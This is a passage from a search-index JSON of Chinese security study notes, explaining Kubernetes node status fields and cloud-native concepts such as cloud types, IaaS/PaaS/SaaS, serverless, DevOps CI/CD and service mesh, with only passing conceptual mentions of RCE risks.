\u7248\u672c\uff08\u5982\u679c\u4f7f\u7528\u4e86\uff09\u548c\u64cd\u4f5c\u7cfb\u7edf\u540d\u79f0\u3002\u8fd9\u4e9b\u4fe1\u606f\u7531 kubelet \u4ece\u8282\u70b9\u4e0a\u641c\u96c6\u800c\u6765\u3002 \u63cf\u8ff0\u8282\u70b9\u4e0a\u7684\u53ef\u7528\u8d44\u6e90\uff1aCPU\u3001\u5185\u5b58\u548c\u53ef\u4ee5\u8c03\u5ea6\u5230\u8282\u70b9\u4e0a\u7684 Pod \u7684\u4e2a\u6570\u4e0a\u9650\u3002 Ready \u5982\u8282\u70b9\u662f\u5065\u5eb7\u7684\u5e76\u5df2\u7ecf\u51c6\u5907\u597d\u63a5\u6536 Pod \u5219\u4e3a True\uff1bFalse \u8868\u793a\u8282\u70b9\u4e0d\u5065\u5eb7\u800c\u4e14\u4e0d\u80fd\u63a5\u6536 Pod\uff1bUnknown \u8868\u793a\u8282\u70b9\u63a7\u5236\u5668\u5728\u6700\u8fd1 node-monitor-grace-period \u671f\u95f4\uff08\u9ed8\u8ba4 40 \u79d2\uff09\u6ca1\u6709\u6536\u5230\u8282\u70b9\u7684\u6d88\u606f DiskPressure\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u7684\u7a7a\u95f2\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u7528\u4e8e\u6dfb\u52a0\u65b0 Pod, \u5426\u5219\u4e3a False MemoryPressure\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u5b58\u5728\u5185\u5b58\u538b\u529b\uff0c\u5373\u8282\u70b9\u5185\u5b58\u53ef\u7528\u91cf\u4f4e\uff0c\u5426\u5219\u4e3a False PIDPressure\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u5b58\u5728\u8fdb\u7a0b\u538b\u529b\uff0c\u5373\u8282\u70b9\u4e0a\u8fdb\u7a0b\u8fc7\u591a\uff1b\u5426\u5219\u4e3a False NetworkUnavailable\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u7f51\u7edc\u914d\u7f6e\u4e0d\u6b63\u786e\uff1b\u5426\u5219\u4e3a False HostName\uff1a\u7531\u8282\u70b9\u7684\u5185\u6838\u8bbe\u7f6e\u3002\u53ef\u4ee5\u901a\u8fc7 kubelet \u7684 \u2014hostname-override \u53c2\u6570\u8986\u76d6\u3002 ExternalIP\uff1a\u901a\u5e38\u662f\u8282\u70b9\u7684\u53ef\u5916\u90e8\u8def\u7531\uff08\u4ece\u96c6\u7fa4\u5916\u53ef\u8bbf\u95ee\uff09\u7684 IP \u5730\u5740\u3002 InternalIP\uff1a\u901a\u5e38\u662f\u8282\u70b9\u7684\u4ec5\u53ef\u5728\u96c6\u7fa4\u5185\u90e8\u8def\u7531\u7684 IP \u5730\u5740\u3002 \u300a\u4e91\u662f\u4ec0\u4e48- \u5b9a\u4e49 - Microsoft Azure\u300b","title":"ref"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/","text":"\u4e91\u539f\u751f\u7684\u6982\u5ff5\u4eec \u76ee\u5f55 \u79c1\u6709\u3001\u516c\u6709\u3001\u6df7\u5408\u4e91 IaaS\u3001PaaS\u548cSaaS serverless DevOps \u670d\u52a1\u7f51\u683c \u79c1\u6709\u3001\u516c\u6709\u3001\u6df7\u5408\u4e91 \u516c\u6709\u4e91\uff1a\u7531\u4e91\u670d\u52a1\u5382\u5546\u63d0\u4f9b\u7684\u4e91\u670d\u52a1\uff0c\u670d\u52a1\u5668\u673a\u623f\u5728\u4e91\u670d\u52a1\u5382\u5546\uff0c\u6211\u4eec\u79df\u7528\u8fd9\u4e9b\u670d\u52a1\u5668\u7684\u4f7f\u7528\u6743\u3002\u6bd4\u5982VPS\u3001\u4e91\u670d\u52a1\u5668\u5c31\u5c5e\u4e8e\u516c\u6709\u4e91\u8303\u7574 \u79c1\u6709\u4e91\uff1a\u67b6\u8bbe\u5728\u4f01\u4e1a\u5185\u90e8\u7684\u7edf\u4e00\u7684\u670d\u52a1\u5668\u673a\u623f\u3002\u6bd4\u5982\u6bcd\u516c\u53f8\u67b6\u8bbe\u4e86\u4e91\u670d\u52a1\u5668\u673a\u623f\u4e13\u4f9b\u5206\u516c\u53f8\u4f7f\u7528\uff0c\u5206\u516c\u53f8\u5c31\u4e0d\u7528\u81ea\u5df1\u518d\u67b6\u8bbe\u673a\u623f\u4e86\u3002 \u6df7\u5408\u4e91\uff1a\u516c\u6709\u4e91\u548c\u79c1\u6709\u4e91\u90fd\u7528\u3002\u6bd4\u5982\u4e00\u4e2a\u516c\u53f8\u4e00\u5f00\u59cb\u662f\u79c1\u6709\u4e91\uff0c\u4f46\u968f\u7740\u4e1a\u52a1\u53d1\u5c55\uff0c\u79c1\u6709\u4e91\u4e0d\u80fd\u6ee1\u8db3\u4e1a\u52a1\u9700\u6c42\uff0c\u4f46\u516c\u53f8\u53c8\u4e0d\u60f3\u6269\u5efa\u673a\u623f\uff0c\u4e8e\u662f\u79df\u7528\u4e86\u4e00\u6279\u516c\u6709\u4e91\u673a\u5668\uff0c\u8fd9\u5c31\u662f\u6df7\u5408\u4e91\u3002 \u4e13\u6709\u4e91\uff1a\u4e00\u79cd\u79c1\u6709\u5316\u90e8\u7f72\u7684\u516c\u6709\u4e91 IaaS\u3001PaaS\u548cSaaS \u4e09\u4e2a\u540d\u8bcd\u7684\u9996\u5b57\u6bcd\u5206\u522b\u5bf9\u5e94 \u57fa\u7840\u8bbe\u65bd(infrastructure)\u3001\u5e73\u53f0(platform)\u548c\u8f6f\u4ef6(software) IaaS\u7684\u610f\u601d\u662f \u57fa\u7840\u8bbe\u65bd\u5373\u670d\u52a1 \u4f60\u60f3\u642d\u4e00\u4e2a\u535a\u5ba2\uff0c\u5982\u679c\u8d70\u7684\u662fIaaS\u8def\u7ebf\uff0c\u4e91\u670d\u52a1\u5382\u5546\u4f1a\u7ed9\u4f60\u63d0\u4f9b\u4e00\u5806\u786c\u4ef6\u8bbe\u5907\uff0c\u4f60\u5f97\u81ea\u5df1\u88c5\u64cd\u4f5c\u7cfb\u7edf\u3001\u5f00\u53d1\u73af\u5883\u7b49\u5de5\u5177\uff0c\u4f60\u6709\u5f88\u9ad8\u7684\u81ea\u7531\u5ea6\u6765\u6307\u5b9a\u8fd9\u4e9b\u8bbe\u5907\u6765\u5e72\u4ec0\u4e48\u3002\u4e91\u670d\u52a1\u5668\u548cVPS\u5c31\u5c5e\u4e8eIaaS\u6982\u5ff5\u3002 \u6bd4\u8d77\u81ea\u5df1\u672c\u5730\u642d\u5efa\u4e00\u4e2a\u535a\u5ba2\u786e\u5b9e\u8282\u7ea6\u4e86\u5f88\u591a\u6210\u672c\uff0c\u4f46\u662f\u8fd9\u6837\u505a\u4ecd\u7136\u9700\u8981\u4f60\u6709\u5f88\u9ad8\u7684\u6280\u672f\u80fd\u529b\uff0c\u5e76\u4e14\u4ecd\u7136\u9700\u8981\u4ed8\u51fa\u6bd4\u8f83\u591a\u7684\u7ef4\u62a4\u7ba1\u7406\u6210\u672c\u3002 PaaS\u7684\u610f\u601d\u662f \u5e73\u53f0\u5373\u670d\u52a1 \u4f60\u60f3\u642d\u4e00\u4e2a\u535a\u5ba2\uff0c\u5982\u679c\u8d70\u7684\u662fPaaS\u8def\u7ebf\uff0c\u4e91\u670d\u52a1\u5382\u5546\u4f1a\u7ed9\u4f60\u63d0\u4f9b\u5df2\u7ecf\u628a\u64cd\u4f5c\u7cfb\u7edf\u3001\u5f00\u53d1\u73af\u5883\u3001\u6570\u636e\u5e93\u3001\u4e2d\u95f4\u4ef6\u7b49\u57fa\u7840\u5de5\u5177\u90fd\u5df2\u7ecf\u90e8\u7f72\u597d\u7684\u4e91\u670d\u52a1\u5668 \u6bd4\u8d77IaaS\u76f4\u63a5\u7ed9\u4f60\u4e00\u5806\u786c\u4ef6\uff0c\u63d0\u4f9b\u57fa\u7840\u8bbe\u65bd\u5df2\u7ecf\u642d\u5efa\u5b8c\u6bd5\u7684\u4e91\u670d\u52a1\u5668\u4f1a\u663e\u5f97\u66f4\u52a0\u53cb\u597d\uff0c\u535a\u5ba2\u4e0a\u7ebf\u7684\u901f\u5ea6\u4e5f\u4f1a\u66f4\u5feb\uff0c\u4f46\u662f\u6bd4\u8d77IaaS\u727a\u7272\u4e86\u4e00\u70b9\u7075\u6d3b\u6027 SaaS \u7684\u610f\u601d\u65f6 \u8f6f\u4ef6\u5373\u670d\u52a1 \u8bf4\u767d\u4e86\u5c31\u662f\u4e91\u8f6f\u4ef6\u3002 \u6bd4\u5982\u767e\u5ea6\u7f51\u76d8\u5c31\u5c5e\u4e8eSaas\u6982\u5ff5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u767e\u5ea6\u7f51\u76d8\u6765\u5b58\u50a8\u6570\u636e\u3002\u4e0d\u8bba\u662fIaaS\u3001PaaS\uff0c\u60f3\u8981\u642d\u5efa\u4e00\u4e2a\u5b58\u50a8\u6570\u636e\u7684\u4e91\u5b58\u50a8\u5e73\u53f0\u90fd\u8fd8\u662f\u9700\u8981\u4e00\u70b9\u8ba1\u7b97\u673a\u57fa\u7840\u7684\uff0c\u800c\u4f7f\u7528\u767e\u5ea6\u7f51\u76d8\u53ea\u9700\u4e0b\u8f7d\u4e00\u4e2a\u767e\u5ea6\u7f51\u76d8\u6ce8\u518c\u4e2a\u8d26\u53f7\u5c31\u80fd\u5f00\u7bb1\u5373\u7528\uff0c\u65b9\u4fbf\u4e86\u592a\u591a\u3002 \u6bd4\u8d77IaaS\u3001PaaS\u786e\u5b9e\u65b9\u4fbf\u4e86\u5f88\u591a\uff0c\u4f46\u662f\u7075\u6d3b\u6027\u4e5f\u53d7\u5230\u4e86\u5f88\u5927\u7684\u963b\u788d\u3002 \u9664\u4e86\u4e0a\u9762\u7684\u4e09\u4e2a\u6982\u5ff5\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u7c7b\u4f3c\u7684\u6982\u5ff5\u3002 BaaS \u540e\u7aef\u5373\u670d\u52a1\u3001FaaS\u51fd\u6570\u5373\u670d\u52a1\u3002\u8fd9\u4e24\u4e2a\u6982\u5ff5\u90fd\u5c5e\u4e8eServerless\uff08\u65e0\u670d\u52a1\uff09\u7684\u8303\u7574\uff0c\u4e0e\u4e0a\u9762\u4e09\u4e2a\u6709\u70b9\u533a\u522b\u3002\u65e0\u670d\u52a1\u662f\u4e00\u79cd\u4e91\u539f\u751f\u6a21\u578b\uff1a\u5f00\u53d1\u8005\u4e0d\u7528\u53bb\u7ba1\u670d\u52a1\u5668\u53ea\u8d1f\u8d23\u5f00\u53d1\u5c31\u884c BaaS\u540e\u7aef\u5373\u670d\u52a1 \u5bf9\u4e8e\u642d\u5efa\u7f51\u7ad9\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528SaaS\u5efa\u7ad9\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u60f3\u8981\u66f4\u6539\u524d\u7aef\u9875\u9762\uff08\u6bd4\u5982\u52a0\u4e00\u4e2alogo\uff09\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u9047\u5230\u9ebb\u70e6\uff1a\u90a3\u4e48\u591a\u7528\u6237\u5728\u7528\uff0c\u4e0d\u80fd\u4e3a\u4e86\u4f60\u4e00\u4e2a\u4eba\u800c\u6539\u3002 BaaS\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u800c\u751f\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8d1f\u8d23\u524d\u7aef\u90e8\u5206\u7684\u5f00\u53d1\uff0c\u540e\u7aef\u90e8\u5206\u5c31\u4ea4\u7ed9\u4e91\u670d\u52a1\u5382\u5546\u5427\u3002 FaaS \u51fd\u6570\u5373\u670d\u52a1 \u4e91\u51fd\u6570\u5c31\u5c5e\u4e8e\u6b64\u7c7b\u3002\u6211\u4eec\u76f4\u63a5\u53ef\u4ee5\u5728\u4e91\u4e0a\u90e8\u7f72\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u6bcf\u88ab\u8c03\u7528\u4e00\u6b21\u4ea7\u751f\u4e00\u6b21\u6536\u8d39\u3002 \u6536\u8d39\u66f4\u52a0\u7075\u6d3b\u4e86\u3002 FaaS \u7684\u76f8\u5173\u4ea7\u54c1\u4e3b\u8981\u6709 AWS \u7684 Lambda\u3001Azure \u7684 Functions Serverless Compute\u3001GCP \u7684 Firebase Cloud Functions\u3001\u963f\u91cc\u4e91\u7684 Function Compute \u7b49 serverless \u65e0\u670d\u52a1\u5668\u8ba1\u7b97\uff0c\u6838\u5fc3\u601d\u60f3\u662f\u8ba9\u5f00\u53d1\u8005\u6ce8\u91cd\u4e8e\u4ee3\u7801\u5f00\u53d1\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u73af\u5883\u914d\u7f6e\u7b49\u5de5\u4f5c\u3002 Faas\u548cBaas\u5c31\u662fServerless\u601d\u60f3\u7684\u4f53\u73b0\u4e4b\u4e00\u3002 \u6240\u9762\u4e34\u7684\u5b89\u5168\u95ee\u9898\uff1a \u6587\u4ef6\u9a7b\u7559\u5bfc\u81f4RCE \u73af\u5883\u542f\u52a8\u65f6\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u5e93\u9020\u6210RCE DevOps \u8fd9\u662f\u4e00\u4e2a\u6211\u968f\u4fbf\u627e\u7684DevOps demo\u7f51\u7ad9\uff0c\u53ef\u4ee5\u8fdb\u53bb\u611f\u53d7\u611f\u53d7 http://dockerone.com/article/8948 \u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u52a0\u5f3a\u5f00\u53d1\u4e0e\u8fd0\u7ef4\u4eba\u5458\u4e4b\u95f4\u6c9f\u901a\u6548\u7387\u7684\u4e00\u4e2a\u5e73\u53f0\u3002\u4f7f\u5f00\u53d1\u8fd0\u7ef4\u4e00\u4f53\u5316\u3002DEV\u5c31\u662f\u5f00\u53d1\uff0cOPS\u5c31\u662f\u8fd0\u7ef4\u3002 \u6700\u5f00\u59cb\u7a0b\u5e8f\u5f00\u53d1\u662f\u5355\u4f53\u67b6\u6784+\u7011\u5e03\u6a21\u5f0f\uff0c\u4f46\u968f\u7740\u4e1a\u52a1\u91cf\u7684\u589e\u591a\uff0c\u9700\u8981\u7684\u5de5\u4f5c\u4eba\u5458\u4e5f\u8d8a\u591a\uff0c\u9700\u8981\u591a\u4eba\u534f\u4f5c\u5f00\u53d1\uff0c\u654f\u6377\u5f00\u53d1\u5c31\u51fa\u73b0\u4e86\u3002 \u4f46\u662f\u654f\u6377\u5f00\u53d1\u6ca1\u6709\u89e3\u51b3\u5f00\u53d1\u548c\u8fd0\u7ef4\u4eba\u5458\u4e4b\u95f4\u7684\u77db\u76fe\u201c\u8fd0\u7ef4\u7684\u5bbf\u547d\u5c31\u662f\u7ef4\u7a33\uff0c\u4ed6\u4eec\u662f\u5f88\u8ba8\u538c\u53d8\u52a8\u7684\uff1b\u5f00\u53d1\u7684\u5929\u804c\u786e\u662f\u4e0d\u65ad\u5730\u63a8\u4ee3\u7801\u4e0a\u7ebf\uff0c\u8fdb\u884c\u4ee3\u7801\u53d8\u52a8\uff0c\u66f4\u66ff\u8fed\u4ee3\uff0c\u8fd9\u4e24\u4e2a\u5de5\u79cd\u5929\u751f\u5c31\u662f\u5bf9\u7acb\u7684\u201d\uff0c\u6240\u4ee5DevOps\u51fa\u73b0\u4e86\uff0c\u5b83\u7684\u51fa\u73b0\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u4e2a\u95ee\u9898\uff0c\u589e\u5f3a\u5f00\u53d1\u4e0e\u8fd0\u7ef4\u4e4b\u95f4\u7684\u6c9f\u901a\u6548\u7387\u3002 DevOps\u5e38\u89c1\u7684\u4e00\u4e9b\u5e94\u7528 \u9879\u76ee\u7ba1\u7406\uff08PM\uff09\uff1ajira\u3002\u8fd0\u8425\u53ef\u4ee5\u4e0a\u53bb\u63d0\u95ee\u9898\uff0c\u53ef\u4ee5\u770b\u5230\u5404\u4e2a\u95ee\u9898\u7684\u5b8c\u6574\u7684\u5de5\u4f5c\u6d41\uff0c\u5f85\u89e3\u51b3\u672a\u89e3\u51b3\u7b49 \u4ee3\u7801\u7ba1\u7406\uff1agitlab\u3002jenkins\u6216\u8005K8S\u90fd\u53ef\u4ee5\u96c6\u6210gitlab\uff0c\u8fdb\u884c\u4ee3\u7801\u7ba1\u7406\uff0c\u4e0a\u7ebf\uff0c\u56de\u6eda\u7b49\uff1b \u6301\u7eed\u96c6\u6210CI\uff08Continuous Integration\uff09\uff1agitlab ci\u3002\u5f00\u53d1\u4eba\u5458\u63d0\u4ea4\u4e86\u65b0\u4ee3\u7801\u4e4b\u540e\uff0c\u7acb\u523b\u8fdb\u884c\u6784\u5efa\u3001\uff08\u5355\u5143\uff09\u6d4b\u8bd5\u3002\u6839\u636e\u6d4b\u8bd5\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u65b0\u4ee3\u7801\u548c\u539f\u6709\u4ee3\u7801\u80fd\u5426\u6b63\u786e\u5730\u96c6\u6210\u5728\u4e00\u8d77 \u6301\u7eed\u4ea4\u4ed8CD\uff08Continuous Delivery\uff09\uff1agitlab cd\u3002\u5b8c\u6210\u5355\u5143\u6d4b\u8bd5\u540e\uff0c\u53ef\u4ee5\u628a\u4ee3\u7801\u90e8\u7f72\u5230\u8fde\u63a5\u6570\u636e\u5e93\u7684 Staging \u73af\u5883\u4e2d\u66f4\u591a\u7684\u6d4b\u8bd5\u3002\u5982\u679c\u4ee3\u7801\u6ca1\u6709\u95ee\u9898\uff0c\u53ef\u4ee5\u7ee7\u7eed\u624b\u52a8\u90e8\u7f72\u5230\u751f\u4ea7\u73af\u5883\u4e2d\u3002 \u955c\u50cf\u4ed3\u5e93\uff1aVMware Harbor\uff0c\u79c1\u670dnexus\u3002 \u5bb9\u5668\uff1aDocker\u3002 \u7f16\u6392\uff1aK8S\u3002 \u670d\u52a1\u6cbb\u7406\uff1aConsul\u3002\u811a \u672c\u8bed\u8a00\uff1aPython\u3002 \u65e5\u5fd7\u7ba1\u7406\uff1aCat+Sentry\uff0c\u8fd8\u6709\u79cd\u5e38\u7528\u7684\u662fELK\u3002 \u7cfb\u7edf\u76d1\u63a7\uff1aPrometheus\u3002 \u8d1f\u8f7d\u5747\u8861\uff1aNginx\u3002 \u7f51\u5173\uff1aKong\uff0czuul\u3002 \u94fe\u8def\u8ffd\u8e2a\uff1aZipkin\u3002 \u4ea7\u54c1\u548cUI\u56fe\uff1a\u84dd\u6e56\u3002 \u516c\u53f8\u5185\u90e8\u6587\u6863\uff1aConfluence\u3002 \u62a5\u8b66\uff1a\u63a8\u9001\u5230\u5de5\u4f5c\u7fa4\u3002 \u2014\u2014\u5f15\u7528\u81ea\u77e5\u4e4e\uff1a\u5c0f\u9f99\u98de \u53ef\u4ee5\u4ece\u4e0a\u9762\u770b\u5230CI\uff08\u6301\u7eed\u96c6\u6210\uff09/CD\uff08\u6301\u7eed\u4ea4\u4ed8 \uff09\u8fd9\u4e2a\u6982\u5ff5 CI\u6301\u7eed\u96c6\u6210\u6784\u5efa\u8f6f\u4ef6\u548c\u5b8c\u6210\u521d\u59cb\u6d4b\u8bd5\u7684\u8fc7\u7a0b\u3002\u5927\u6982\u4f1a\u7ecf\u5386\u4e0b\u9762\u7684\u9636\u6bb5\uff1a \u4ee3\u7801\u63d0\u4ea4\uff1a\u901a\u8fc7Github\u3001gitlab\u7b49\u6280\u672f\u5c06\u4ee3\u7801\u63d0\u4ea4\u5230\u4ee3\u7801\u5b58\u50a8\u5e93 \u9759\u6001\u4ee3\u7801\u68c0\u67e5\uff1aSAST\u767d\u76d2\u6d4b\u8bd5\uff0c\u4ee5\u53d1\u73b0\u8f6f\u4ef6\u7f3a\u9677\u6216\u8005\u5b89\u5168\u6f0f\u6d1e \u6784\u5efa\uff1a\u5c06\u6e90\u4ee3\u7801\u6784\u5efa\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6\u6216\u8005\u6784\u5efa\u4ea7\u7269\uff0c\u8fdb\u884c\u6784\u5efa\u9a8c\u8bc1\u6d4b\u8bd5\u67e5\u770b\u6a21\u5757\u662f\u5426\u517c\u5bb9\uff0c\u5e76\u63d0\u4ea4\u5230\u4e2d\u592e\u5b58\u50a8\u5e93\u8fdb\u884c\u7ba1\u7406\u3002\u4e00\u822c\u4f1a\u7528\u5230jenkins\uff0cmaven\u7b49\u5de5\u5177 \u6d4b\u8bd5\uff1a\u5355\u5143\u6d4b\u8bd5\uff0c\u6d4bbug CD\u662f\u5c06\u4ee3\u7801\u4e0e\u57fa\u7840\u8bbe\u65bd\u76f8\u7ed3\u5408\u7684\u8fc7\u7a0b\uff0c\u786e\u4fdd\u5b8c\u6210\u6240\u6709\u6d4b\u8bd5\u5e76\u9075\u5faa\u7b56\u7565\uff0c\u7136\u540e\u5c06\u4ee3\u7801\u90e8\u7f72\u5230\u9884\u671f\u73af\u5883\u4e2d bake\uff1a\u521b\u5efa\u955c\u50cf\u5b9e\u4f8b \u90e8\u7f72\uff1a\u5c06\u955c\u50cf\u5b9e\u4f8b\u8fdb\u884c\u90e8\u7f72 \u9a8c\u8bc1\uff1a\u89e3\u51b3\u6545\u969c \u76d1\u63a7\uff1a\u88c5\u76d1\u63a7\u8f6f\u4ef6\uff08Zabbix\u3001Nagios\u7b49\uff09\u5bf9\u7cfb\u7edf\u8fdb\u884c\u5206\u6790\u76d1\u63a7 \u53cd\u9988\u548c\u534f\u4f5c\uff1a\u53cd\u9988\u7cfb\u7edf\uff0c\u5411\u5f00\u53d1\u4eba\u5458\u548c\u9879\u76ee\u7ecf\u7406\u63d0\u4f9b\u53cd\u9988\uff0c\u4ee5\u51cf\u5c11\u9519\u8bef\u548c\u6027\u80fd\u95ee\u9898\uff0c\u5e38\u7528\u8f6f\u4ef6\uff08JIRA\uff0c\u7535\u5b50\u90ae\u4ef6\uff09 CI/CD\u662fDevOps\u5e73\u53f0\u4e0d\u53ef\u6216\u7f3a\u7684\u90e8\u5206\uff0c\u800cCI/CD\u53c8\u662f\u4e0e\u529e\u516c\u7f51\u3001\u751f\u4ea7\u7f51\u3001\u5f00\u53d1\u7f51\u90fd\u6709\u4ea4\u4e92\u7684\u4e1c\u897f\uff0c\u6240\u4ee5\u901a\u5e38\u60c5\u51b5\u4e0b\u63a7\u5236\u4e86DevOps\u5e73\u53f0\u4e5f\u5c31\u610f\u5473\u7740\u6709\u80fd\u7a81\u7834\u8fdb\u751f\u4ea7\u7f51\u7684\u65b9\u6cd5\u3002 \u670d\u52a1\u7f51\u683c \u63d0\u670d\u52a1\u7f51\u683c\u5c31\u4e0d\u5f97\u4e0d\u8bf4\u5230\u5fae\u670d\u52a1\uff1a https://www.zhihu.com/question/65502802 \u7b80\u800c\u8a00\u4e4b\uff0c\u5fae\u670d\u52a1\u628a\u4e1a\u52a1\u7cfb\u7edf\u62c6\u5206\u6210\u4e00\u4e2a\u4e00\u4e2a\u7684\u6a21\u5757\uff08\u6216\u8005\u53eb\u5fae\u670d\u52a1\uff09\uff0c\u6bcf\u4e2a\u6a21\u5757\u5404\u53f8\u5176\u804c\uff0c\u80fd\u6709\u6548\u89e3\u51b3\u4e1a\u52a1\u7cfb\u7edf\u53d1\u5c55\u5230\u540e\u671f\u6742\u4e71\u65e0\u7ae0\u7684\u72b6\u6001\u3002 \u4f46\u662f\u5fae\u670d\u52a1\u4e0e\u5fae\u670d\u52a1\u4e4b\u95f4\u4e5f\u662f\u6709\u901a\u4fe1\u7684\uff0c\u5728\u6a21\u5757\u5c11\u7684\u65f6\u5019\u53ea\u9700\u8981\u7528\u4ee3\u7801\u903b\u8f91\u4e3a\u6bcf\u4e2a\u670d\u52a1\u7f16\u5199\u4e00\u5957\u4e0e\u5176\u4ed6\u5fae\u670d\u52a1\u7684\u901a\u4fe1\u903b\u8f91\u5373\u53ef \u4f46\u662f\u968f\u7740\u4e1a\u52a1\u7cfb\u7edf\u6269\u5927\uff0c\u5fae\u670d\u52a1\u589e\u591a\uff0c\u4e3a\u6bcf\u4e2a\u5fae\u670d\u52a1\u7f16\u5199\u901a\u4fe1\u903b\u8f91\u9700\u8981\u4ed8\u51fa\u5927\u91cf\u6210\u672c\uff0c\u6240\u4ee5\u670d\u52a1\u7f51\u683c\u7684\u6982\u5ff5\u51fa\u73b0\u4e86\uff0c\u670d\u52a1\u7f51\u683c\u53ef\u4ee5\u5c06\u5927\u91cf\u79bb\u6563\u7684\u5fae\u670d\u52a1\u96c6\u5408\u4e3a\u4e00\u4e2a\u6574\u4f53\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c\u670d\u52a1\u7f51\u683c\u4e3a\u6bcf\u4e2a\u5fae\u670d\u52a1\u6784\u5efa\u4e86\u4e00\u4e2a\u4ee3\u7406\uff08sidecar\uff09\uff0c\u8be5\u4ee3\u7406\u5185\u7f6e\u4e8e\u5fae\u670d\u52a1\u4e2d\u4e13\u95e8\u7684\u57fa\u7840\u67b6\u6784\u5c42 \uff0c\u670d\u52a1\u4e0e\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u901a\u8fc7\u8fd9\u4e2a\u4ee3\u7406\u5b9e\u73b0\uff0c Istio\u5219\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u670d\u52a1\u7f51\u683c\u5e73\u53f0\u3002","title":"\u4e91\u539f\u751f\u7684\u6982\u5ff5\u4eec"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/#_1","text":"","title":"\u4e91\u539f\u751f\u7684\u6982\u5ff5\u4eec"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/#_2","text":"\u79c1\u6709\u3001\u516c\u6709\u3001\u6df7\u5408\u4e91 IaaS\u3001PaaS\u548cSaaS serverless DevOps \u670d\u52a1\u7f51\u683c","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/#_3","text":"\u516c\u6709\u4e91\uff1a\u7531\u4e91\u670d\u52a1\u5382\u5546\u63d0\u4f9b\u7684\u4e91\u670d\u52a1\uff0c\u670d\u52a1\u5668\u673a\u623f\u5728\u4e91\u670d\u52a1\u5382\u5546\uff0c\u6211\u4eec\u79df\u7528\u8fd9\u4e9b\u670d\u52a1\u5668\u7684\u4f7f\u7528\u6743\u3002\u6bd4\u5982VPS\u3001\u4e91\u670d\u52a1\u5668\u5c31\u5c5e\u4e8e\u516c\u6709\u4e91\u8303\u7574 \u79c1\u6709\u4e91\uff1a\u67b6\u8bbe\u5728\u4f01\u4e1a\u5185\u90e8\u7684\u7edf\u4e00\u7684\u670d\u52a1\u5668\u673a\u623f\u3002\u6bd4\u5982\u6bcd\u516c\u53f8\u67b6\u8bbe\u4e86\u4e91\u670d\u52a1\u5668\u673a\u623f\u4e13\u4f9b\u5206\u516c\u53f8\u4f7f\u7528\uff0c\u5206\u516c\u53f8\u5c31\u4e0d\u7528\u81ea\u5df1\u518d\u67b6\u8bbe\u673a\u623f\u4e86\u3002 \u6df7\u5408\u4e91\uff1a\u516c\u6709\u4e91\u548c\u79c1\u6709\u4e91\u90fd\u7528\u3002\u6bd4\u5982\u4e00\u4e2a\u516c\u53f8\u4e00\u5f00\u59cb\u662f\u79c1\u6709\u4e91\uff0c\u4f46\u968f\u7740\u4e1a\u52a1\u53d1\u5c55\uff0c\u79c1\u6709\u4e91\u4e0d\u80fd\u6ee1\u8db3\u4e1a\u52a1\u9700\u6c42\uff0c\u4f46\u516c\u53f8\u53c8\u4e0d\u60f3\u6269\u5efa\u673a\u623f\uff0c\u4e8e\u662f\u79df\u7528\u4e86\u4e00\u6279\u516c\u6709\u4e91\u673a\u5668\uff0c\u8fd9\u5c31\u662f\u6df7\u5408\u4e91\u3002 